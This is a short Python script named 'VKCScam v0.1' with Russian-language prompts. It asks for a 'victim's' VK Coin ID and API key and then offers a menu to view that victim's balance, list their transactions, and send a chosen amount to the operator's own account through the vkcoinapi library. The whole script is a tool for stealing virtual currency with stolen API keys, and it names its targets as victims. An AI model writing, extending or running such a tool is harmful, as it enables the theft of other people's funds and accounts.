import os
import vkcoinapi
id = input("Введите ID жертвы > ")
suka = input("Введите API жертвы > ")
os.system("clear")
from vkcoinapi import *
coin = VKCoin(key = suka, merchantId = id)
print("VKCScam v0.1")
print("API > "+suka)
print("ID >" +id)
print("")
print("Меню:")
print("[1] Баланс жертвы")
print("[2] Перевод")
print("[3] Транзакции")
print("[4] Выход")
menu = input("[VKCScam] > ")
if menu == "1":
    coin.getBalance()
    menu = input("[VKCScam] > ")
if menu == "2":
    id2 = input("Введите свой ID > ")
    bal = input("Сумма перевода > ")
    coin.sendPayment(id2, bal)
    
if menu == "3":
    coin.getTransactions()
    menu = input("[VKCScam] > ")
 
if menu == "4":
    os.system("clear")
    os.system("python screazesoft.py")
